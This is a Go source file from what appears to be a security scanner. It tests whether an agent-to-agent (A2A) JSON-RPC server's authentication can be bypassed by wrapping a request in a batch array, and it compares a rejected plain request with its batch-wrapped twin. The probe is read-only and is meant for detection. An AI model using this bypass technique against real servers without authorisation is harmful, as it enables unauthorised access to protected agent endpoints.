package a2a

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"

	"github.com/calbebop/batesian/internal/attack"
)

// BatchBypassExecutor tests whether an A2A server's authentication can be bypassed
// by wrapping a request in a JSON-RPC batch array (rule a2a-jsonrpc-batch-bypass-001).
//
// The classic JSON-RPC batch bypass: an auth gate inspects the top-level request
// object, but a JSON-RPC batch is an array with no top-level method, so the gate's
// check does not fire and the array is handed to the dispatcher, which runs each
// element. A2A enforces authentication at the HTTP layer (a rejected request
// returns HTTP 401/403), so the bypass shows up as a single request being rejected
// at the transport while the identical request, batch-wrapped, reaches HTTP 200 and
// is dispatched.
//
// Detection sends the IDENTICAL request twice, differing only in batch wrapping,
// for each protocol shape (A2A v1.0 GetTask, then the v0.3 tasks/get fallback):
//   - Control: a plain JSON-RPC object, unauthenticated. It must be rejected with
//     HTTP 401/403 for there to be an auth gate to bypass.
//   - Test: the same object as a one-element batch array, unauthenticated. A
//     CONFIRMED finding is raised only when it reaches HTTP 200 and the dispatcher
//     ran (the batch response carries a result or a non-auth application error such
//     as TaskNotFound).
//
// SAFETY: the probe is a read-only GetTask for a guaranteed non-existent task id.
// It never sends a message, creates, or mutates a task.
type BatchBypassExecutor struct {
	rule attack.RuleContext
}

func init() {
	attack.Register("a2a-jsonrpc-batch-bypass", func(rc attack.RuleContext) attack.Executor {
		return NewBatchBypassExecutor(rc)
	})
}

func NewBatchBypassExecutor(r attack.RuleContext) *BatchBypassExecutor {
	return &BatchBypassExecutor{rule: r}
}

func (e *BatchBypassExecutor) Execute(ctx context.Context, target string, opts attack.Options) ([]attack.Finding, error) {
	vars := attack.NewVars(target, opts.OOBListenerURL)
	endpoint := vars.BaseURL + "/"
	// Deliberately unauthenticated: the rule tests whether a batch slips past the
	// server's auth gate. Injecting opts.Token would mask the bypass.
	client := attack.NewUnauthHTTPClient(opts, vars)

	bogusTask := "batesian-nonexistent-" + vars.RandID

	// Two protocol shapes, tried in order: A2A v1.0 (PascalCase method, A2A-Version
	// header) then the v0.3 slash-method fallback. For each, the control and test
	// use the IDENTICAL request object so the only variable is batch wrapping.
	shapes := []struct {
		label   string
		headers map[string]string
		obj     map[string]interface{}
	}{
		{
			label:   "v1.0 GetTask",
			headers: map[string]string{"A2A-Version": "1.0"},
			obj: map[string]interface{}{
				"jsonrpc": "2.0",
				"id":      "batesian-batch-" + vars.RandID,
				"method":  "GetTask",
				"params":  map[string]interface{}{"id": bogusTask, "historyLength": 1},
			},
		},
		{
			label:   "v0.3 tasks/get",
			headers: nil,
			obj: map[string]interface{}{
				"jsonrpc": "2.0",
				"id":      "batesian-batch-" + vars.RandID,
				"method":  "tasks/get",
				"params":  map[string]interface{}{"id": bogusTask, "historyLength": 1},
			},
		},
	}

	for _, s := range shapes {
		ctrl, err := client.POST(ctx, endpoint, s.headers, s.obj)
		if err != nil {
			continue
		}
		// An HTTP auth gate must reject the single request, otherwise there is no
		// authentication to bypass for this shape.
		if !isA2AAuthRejection(ctrl) {
			continue
		}
		test, err := client.POST(ctx, endpoint, s.headers, []interface{}{s.obj})
		if err != nil {
			continue
		}
		if test.IsSuccess() && a2aBatchDispatched(test.Body) {
			return e.finding(endpoint, s.label, ctrl, test), nil
		}
	}
	return nil, nil
}

func (e *BatchBypassExecutor) finding(endpoint, shape string, ctrl, test *attack.Response) []attack.Finding {
	return []attack.Finding{{
		RuleID:     e.rule.ID,
		RuleName:   e.rule.Name,
		Severity:   "high",
		Confidence: attack.ConfirmedExploit,
		Title:      "A2A authentication bypassed by JSON-RPC batch wrapping",
		Description: fmt.Sprintf(
			"At %s, a single unauthenticated JSON-RPC request was rejected at the HTTP layer, but the "+
				"identical request wrapped in a one-element JSON-RPC batch array reached the dispatcher and "+
				"was processed. A2A enforces authentication at the transport, yet the batch slipped past it, "+
				"so an attacker reaches authenticated methods by array-wrapping them (CWE-288, authentication "+
				"bypass via an alternate channel). A2A does not define batching, so a server should reject a "+
				"JSON-RPC array rather than dispatch it unauthenticated.", endpoint),
		Evidence: fmt.Sprintf(
			"endpoint: %s\nshape: %s\nsingle request: HTTP %d (rejected, unauthenticated)\n"+
				"batch [request]: HTTP %d (processed)\n%s",
			endpoint, shape, ctrl.StatusCode, test.StatusCode, snippet(test.Body, 400)),
		Remediation: e.rule.Remediation,
		TargetURL:   endpoint,
	}}
}

// isA2AAuthRejection reports whether a response is an A2A authentication rejection.
// A2A enforces auth at the HTTP layer, so the primary signal is HTTP 401/403; a
// JSON-RPC error envelope whose message reads as an auth failure is also accepted
// for servers that wrap the rejection at 200. A2A application errors (TaskNotFound
// at -32001, method-not-found, invalid params) are deliberately NOT counted.
func isA2AAuthRejection(resp *attack.Response) bool {
	if resp.StatusCode == 401 || resp.StatusCode == 403 {
		return true
	}
	return errMessageIsAuth(resp.Body)
}

// a2aBatchDispatched reports whether body is a JSON-RPC batch response (a JSON
// array) whose elements show the dispatcher ran: a result, or a non-auth
// application error. An array element that is itself an auth rejection does not
// count (the gate held for the batch too).
func a2aBatchDispatched(body []byte) bool {
	var arr []map[string]json.RawMessage
	if err := json.Unmarshal(body, &arr); err != nil {
		return false
	}
	for _, el := range arr {
		if _, ok := el["result"]; ok {
			return true
		}
		if rawErr, ok := el["error"]; ok && !errMessageIsAuthRaw(rawErr) {
			return true
		}
	}
	return false
}

// authKeywords are substrings that mark a JSON-RPC error message as an auth
// failure. A2A has no numeric auth error code, so classification is message-based.
var authKeywords = []string{"unauth", "authentic", "forbidden", "credential", "permission"}

func errMessageIsAuth(body []byte) bool {
	var obj struct {
		Error json.RawMessage `json:"error"`
	}
	if err := json.Unmarshal(body, &obj); err != nil || len(obj.Error) == 0 {
		return false
	}
	return errMessageIsAuthRaw(obj.Error)
}

func errMessageIsAuthRaw(rawErr json.RawMessage) bool {
	var e struct {
		Message string `json:"message"`
	}
	if err := json.Unmarshal(rawErr, &e); err != nil {
		return false
	}
	msg := strings.ToLower(e.Message)
	for _, kw := range authKeywords {
		if strings.Contains(msg, kw) {
			return true
		}
	}
	return false
}
